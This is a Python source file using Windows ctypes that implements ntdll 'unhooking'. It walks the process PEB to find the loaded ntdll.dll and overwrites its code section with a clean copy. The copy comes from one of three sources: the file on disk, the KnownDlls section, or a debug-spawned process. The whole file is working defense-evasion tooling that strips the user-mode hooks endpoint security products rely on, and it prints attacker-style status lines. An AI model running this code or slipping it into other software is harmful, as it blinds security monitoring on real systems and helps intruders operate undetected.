import ctypes
from ctypes import wintypes


# Structures
class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("Reserved1", wintypes.LPVOID),
        ("PebBaseAddress", wintypes.LPVOID),
        ("Reserved2", wintypes.LPVOID * 2),
        ("UniqueProcessId", wintypes.HANDLE),
        ("Reserved3", wintypes.LPVOID)
    ]

class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.USHORT),
        ("MaximumLength", wintypes.USHORT),
        ("Buffer", wintypes.LPWSTR)
    ]

class OBJECT_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.ULONG),
        ("RootDirectory", wintypes.HANDLE),
        ("ObjectName", ctypes.POINTER(UNICODE_STRING)),
        ("Attributes", wintypes.ULONG),
        ("SecurityDescriptor", wintypes.LPVOID),
        ("SecurityQualityOfService", wintypes.LPVOID)
    ]

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.DWORD),
        ("cbReserved2", wintypes.DWORD),
        ("lpReserved2", wintypes.DWORD),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE)
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD)
    ]


# Constants
GENERIC_READ = 0x80000000
FILE_SHARE_READ = 0x00000001 
FILE_ATTRIBUTE_NORMAL = 0x00000080
OPEN_EXISTING = 3
PAGE_READONLY = 0x02 
SEC_IMAGE_NO_EXECUTE = 0x11000000
FILE_MAP_READ = 4
ProcessBasicInformation = 0 
offset_mappeddll = 4096
PAGE_EXECUTE_WRITECOPY = 0x80
PAGE_EXECUTE_READ = 0x20
SECTION_MAP_READ = 0x0004
DEBUG_PROCESS = 0x00000001


# Functions
ntdll = ctypes.WinDLL("ntdll")
NtQueryInformationProcess = ntdll.NtQueryInformationProcess
NtQueryInformationProcess.restype = wintypes.LONG
NtQueryInformationProcess.argtypes = [wintypes.HANDLE, wintypes.ULONG, wintypes.HANDLE, wintypes.ULONG, wintypes.PULONG]
NtReadVirtualMemory = ntdll.NtReadVirtualMemory
NtReadVirtualMemory.restype = wintypes.LONG
NtReadVirtualMemory.argtypes = [
    wintypes.HANDLE,    # ProcessHandle
    wintypes.LPVOID,    # BaseAddress
    wintypes.LPVOID,    # Buffer
    wintypes.ULONG,     # NumberOfBytesToRead
    wintypes.PULONG     # NumberOfBytesRead
]
NtOpenSection = ntdll.NtOpenSection
NtOpenSection.restype = wintypes.LONG
NtOpenSection.argtypes = [
    wintypes.PHANDLE,   # SectionHandle
    wintypes.DWORD,     # DesiredAccess
    wintypes.LPVOID      # ObjectAttributes
]


# Kernel32 functions
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
CreateFileA = kernel32.CreateFileA
CreateFileA.restype = wintypes.HANDLE
CreateFileA.argtypes = [
    wintypes.LPCSTR,     # lpFileName
    wintypes.DWORD,      # dwDesiredAccess
    wintypes.DWORD,      # dwShareMode
    wintypes.LPVOID,     # lpSecurityAttributes
    wintypes.DWORD,      # dwCreationDisposition
    wintypes.DWORD,      # dwFlagsAndAttributes
    wintypes.HANDLE      # hTemplateFile
]
CreateFileMappingA = kernel32.CreateFileMappingA
CreateFileMappingA.restype = wintypes.HANDLE
CreateFileMappingA.argtypes = [
    wintypes.HANDLE,     # hFile
    wintypes.LPVOID,     # lpFileMappingAttributes
    wintypes.DWORD,      # flProtect
    wintypes.DWORD,      # dwMaximumSizeHigh
    wintypes.DWORD,      # dwMaximumSizeLow
    wintypes.LPCSTR      # lpName
]
MapViewOfFile = kernel32.MapViewOfFile
MapViewOfFile.restype = wintypes.LPVOID
MapViewOfFile.argtypes = [
    wintypes.HANDLE,     # hFileMappingObject
    wintypes.DWORD,      # dwDesiredAccess
    wintypes.DWORD,      # dwFileOffsetHigh
    wintypes.DWORD,      # dwFileOffsetLow
    wintypes.DWORD       # dwNumberOfBytesToMap
]
VirtualProtect = kernel32.VirtualProtect
VirtualProtect.restype = wintypes.BOOL
VirtualProtect.argtypes = [
    wintypes.LPVOID,     # lpAddress
    wintypes.DWORD,     # dwSize
    wintypes.DWORD,      # flNewProtect
    ctypes.POINTER(wintypes.DWORD)  # lpflOldProtect
]
CloseHandle = kernel32.CloseHandle
CloseHandle.restype = wintypes.BOOL
CloseHandle.argtypes = [wintypes.HANDLE]
GetCurrentProcess = kernel32.GetCurrentProcess
GetCurrentProcess.restype = wintypes.HANDLE
CreateProcess = kernel32.CreateProcessW
CreateProcess.restype = wintypes.BOOL
CreateProcess.argtypes = [
    wintypes.LPCWSTR,  # lpApplicationName
    wintypes.LPWSTR,   # lpCommandLine
    wintypes.LPVOID,  # lpProcessAttributes
    wintypes.LPVOID,  # lpThreadAttributes 
    wintypes.BOOL,     # bInheritHandles
    wintypes.DWORD,    # dwCreationFlags
    wintypes.LPVOID,   # lpEnvironment
    wintypes.LPCWSTR,  # lpCurrentDirectory
    ctypes.POINTER(STARTUPINFO),  # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION)  # lpProcessInformation
]
DebugActiveProcessStop = kernel32.DebugActiveProcessStop
DebugActiveProcessStop.restype = wintypes.BOOL
DebugActiveProcessStop.argtypes = [wintypes.HANDLE]
TerminateProcess = kernel32.TerminateProcess
TerminateProcess.restype = wintypes.BOOL
TerminateProcess.argtypes = [wintypes.HANDLE, wintypes.DWORD]


def read_remoteintptr(process_handle, mem_address, number_of_bytes):
    buffer = ctypes.create_string_buffer(number_of_bytes)
    bytes_read = wintypes.ULONG(0)
    status = NtReadVirtualMemory(process_handle, mem_address, buffer, number_of_bytes, ctypes.byref(bytes_read))
    if status != 0:
        return
    read_bytes = buffer.raw[:bytes_read.value][::-1]
    read_int = int(str((read_bytes).hex()),16)
    return read_int


def read_remoteWStr(process_handle, mem_address):
    buffer = ctypes.create_string_buffer(256)
    bytes_read = wintypes.ULONG(0)
    status = NtReadVirtualMemory(process_handle, mem_address, buffer, 256, ctypes.byref(bytes_read))
    if status != 0:
        return ""
    read_bytes = buffer.raw[:bytes_read.value]
    index = read_bytes.find(b'\x00\x00')
    unicode_str = (read_bytes[:index].decode('unicode-escape'))
    unicode_str_clean = "".join(char for char in unicode_str if char.isprintable())
    return unicode_str_clean


def get_local_lib_address(dll_name):
    process_handle = GetCurrentProcess()
    process_information = PROCESS_BASIC_INFORMATION()
    return_length = wintypes.ULONG()
    status = NtQueryInformationProcess(process_handle, ProcessBasicInformation, ctypes.byref(process_information), ctypes.sizeof(process_information), ctypes.byref(return_length))
    if status != 0:
        raise ctypes.WinError(ctypes.get_last_error())
    
    ldr_offset = 0x18
    ldr_pointer = process_information.PebBaseAddress + ldr_offset
    ldr_address = read_remoteintptr(process_handle, ldr_pointer, 8)
    inInitializationOrderModuleList_offset = 0x30
    InInitializationOrderModuleList = ldr_address + inInitializationOrderModuleList_offset
    next_flink = read_remoteintptr(process_handle, InInitializationOrderModuleList, 8)

    dll_base = 1337
    flink_dllbase_offset = 0x20
    flink_buffer_fulldllname_offset = 0x40
    flink_buffer_offset = 0x50

    while (dll_base != 0):
        next_flink = next_flink - 0x10
        dll_base = read_remoteintptr(process_handle, (next_flink + flink_dllbase_offset), 8)
        if dll_base == 0:
            break        
        buffer = read_remoteintptr(process_handle, (next_flink + flink_buffer_offset), 8)
        base_dll_name = read_remoteWStr(process_handle, buffer)
        if (base_dll_name == dll_name):
            return dll_base
        next_flink = read_remoteintptr(process_handle, (next_flink + 0x10), 8)
    return None


def get_section_info(local_ntdll):
    process_handle = GetCurrentProcess()
    e_lfanew_addr = local_ntdll + 0x3C;
    e_lfanew = read_remoteintptr(process_handle, e_lfanew_addr, 4)
    sizeofcode_addr = local_ntdll + e_lfanew + 24 + 4
    sizeofcode = read_remoteintptr(process_handle, sizeofcode_addr, 4)
    baseofcode_addr  = local_ntdll + e_lfanew + 24 + 20
    baseofcode = read_remoteintptr(process_handle, baseofcode_addr, 4)
    return (baseofcode, sizeofcode)


def replace_ntdll_section(unhooked_ntdll_text, local_ntdll_txt, local_ntdll_txt_size):
    # VirtualProtect to PAGE_EXECUTE_WRITECOPY
    old_protection = wintypes.DWORD() 
    vp_bool = VirtualProtect(local_ntdll_txt, local_ntdll_txt_size, PAGE_EXECUTE_WRITECOPY, ctypes.byref(old_protection))
    #print("[+] Virtual Protect result: \t" + str(vp_bool))
    ### input("1")
    # Copy bytes
    ctypes.memmove(local_ntdll_txt, unhooked_ntdll_text, local_ntdll_txt_size)
    #### input("2")
    # VirtualProtect back to PAGE_EXECUTE_READ
    vp_bool = VirtualProtect(local_ntdll_txt, local_ntdll_txt_size, old_protection, ctypes.byref(old_protection))
    #print("[+] Virtual Protect result: \t" + str(vp_bool))


def create_unicode_string(string):
    u_string = UNICODE_STRING()
    u_string.Length = len(string) * 2  # Each character is 2 bytes
    u_string.MaximumLength = u_string.Length + 2
    u_string.Buffer = string
    return u_string


def overwrite_disk(path):
    #print("[+] Overwriting from disk file " + path)
    file_handle = wintypes.HANDLE()
    # CreateFileA
    file_handle = CreateFileA(path.encode('utf-8'), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
    #print("[+] File handle:\t\t" + str(file_handle))
    # CreateFileMappingA
    mapping_handle =  CreateFileMappingA(file_handle, 0, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, None)
    #print("[+] Mapping handle:\t\t" + str(mapping_handle))
    # MapViewOfFile
    unhooked_ntdll = MapViewOfFile(mapping_handle, FILE_MAP_READ, 0, 0, 0)
    #print("[+] Map view:\t\t\t" + hex(unhooked_ntdll))
    #CloseHandle
    createfile_ch = CloseHandle(file_handle)
    createfilemapping_ch = CloseHandle(mapping_handle)
    #print("[+] Closing file handle: \t" + str(createfile_ch))
    #print("[+] Closing mapping handle: \t" + str(createfilemapping_ch))
    # Replace
    unhooked_ntdll_text = unhooked_ntdll + offset_mappeddll
    #print("[+] Mapped Ntdll Handle .Text:\t" + hex(unhooked_ntdll_text))
    local_ntdll = get_local_lib_address("ntdll.dll")
    #print("[+] Local Ntdll Handle:\t\t" + hex(local_ntdll))
    local_ntdll_txt_addr, local_ntdll_txt_size = get_section_info(local_ntdll)
    local_ntdll_txt = local_ntdll + local_ntdll_txt_addr
    #print("[+] Local Ntdll Text Section: \t" + hex(local_ntdll_txt))
    print("[+] Copying " + str(local_ntdll_txt_size) + " bytes from " + hex(unhooked_ntdll_text) + " to " + hex(local_ntdll_txt))
    replace_ntdll_section(unhooked_ntdll_text, local_ntdll_txt, local_ntdll_txt_size)


def overwrite_knowndlls():
    #print("[+] Overwriting using KnownDlls folder")
    # NtOpenSection
    section_name = "\\KnownDlls\\ntdll.dll"
    section_handle = wintypes.HANDLE()
    unicode_string = create_unicode_string(section_name)
    object_attributes = OBJECT_ATTRIBUTES()
    object_attributes.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
    object_attributes.RootDirectory = None
    object_attributes.ObjectName = ctypes.pointer(unicode_string)
    object_attributes.Attributes = 0
    object_attributes.SecurityDescriptor = None
    object_attributes.SecurityQualityOfService = None
    status = NtOpenSection(ctypes.byref(section_handle), SECTION_MAP_READ, ctypes.byref(object_attributes))
    if status != 0:
        print("[-] NtOpenSection error code:\t\t" + str(status))
    #print("[+] Section handle: \t\t" + str(section_handle.value))
    # MapViewOfFile
    unhooked_ntdll = MapViewOfFile(section_handle, SECTION_MAP_READ, 0, 0, 0)
    #print("[+] Map view:\t\t\t" + hex(unhooked_ntdll))
    # CloseHandle
    opensection_ch = CloseHandle(section_handle)
    #print("[+] Closing file handle: \t" + str(opensection_ch))
    # Replace
    unhooked_ntdll_text = unhooked_ntdll + offset_mappeddll
    #print("[+] Mapped Ntdll Handle .Text:\t" + hex(unhooked_ntdll_text))
    local_ntdll = get_local_lib_address("ntdll.dll")
    #print("[+] Local Ntdll Handle:\t\t" + hex(local_ntdll))
    local_ntdll_txt_addr, local_ntdll_txt_size = get_section_info(local_ntdll)
    local_ntdll_txt = local_ntdll + local_ntdll_txt_addr
    #print("[+] Local Ntdll Text Section: \t" + hex(local_ntdll_txt))
    print("[+] Copying " + str(local_ntdll_txt_size) + " bytes from " + hex(unhooked_ntdll_text) + " to " + hex(local_ntdll_txt))
    replace_ntdll_section(unhooked_ntdll_text, local_ntdll_txt, local_ntdll_txt_size)


def overwrite_debugproc(path):
    #print("[+] Overwriting from debug process " + path)
    # CreateProcess
    startup_info = STARTUPINFO()
    process_info = PROCESS_INFORMATION()
    startup_info.cb = ctypes.sizeof(STARTUPINFO)
    success = CreateProcess(
        path,                   # lpApplicationName
        None,           # lpCommandLine
        None,                   # lpProcessAttributes
        None,                   # lpThreadAttributes
        False,                  # bInheritHandles
        DEBUG_PROCESS,     # dwCreationFlags
        None,                   # lpEnvironment
        None,                   # lpCurrentDirectory
        ctypes.byref(startup_info),  # lpStartupInfo
        ctypes.byref(process_info)   # lpProcessInformation
    )
    if not success:
        print("[-] CreateProcess error code " + str(success))
    #print("[+] CreateProcess code: \t" + str(success))

    # Local process
    local_ntdll = get_local_lib_address("ntdll.dll")
    #print("[+] Local Ntdll Handle:\t\t" + hex(local_ntdll))
    local_ntdll_txt_addr, local_ntdll_txt_size = get_section_info(local_ntdll)
    local_ntdll_txt = local_ntdll + local_ntdll_txt_addr
    #print("[+] Local Ntdll Text Section: \t" + hex(local_ntdll_txt))
    
    # NtReadVirtualMemory
    # debugged_process ntdll_handle = local ntdll_handle --> debugged_process .text section ntdll_handle = local .text section ntdll_handle
    buffer = ctypes.create_string_buffer(local_ntdll_txt_size)
    bytes_read = wintypes.ULONG(0)
    status = NtReadVirtualMemory(process_info.hProcess, local_ntdll_txt, buffer, local_ntdll_txt_size, ctypes.byref(bytes_read))
    if status != 0:
        print("[-] Error calling NtReadVirtualMemory " + status)
    # DebugActiveProcessStop
    daps_bool = DebugActiveProcessStop(process_info.dwProcessId)
    #print("[+] DebugActiveProcStop result:\t" + str(daps_bool))
    # TerminateProcess
    tp_bool = TerminateProcess(process_info.hProcess, 0)
    #print("[+] TerminateProcess result:\t" + str(tp_bool))
    print("[+] Copying " + str(local_ntdll_txt_size) + " bytes to " + hex(local_ntdll_txt))
    replace_ntdll_section(buffer.raw, local_ntdll_txt, local_ntdll_txt_size)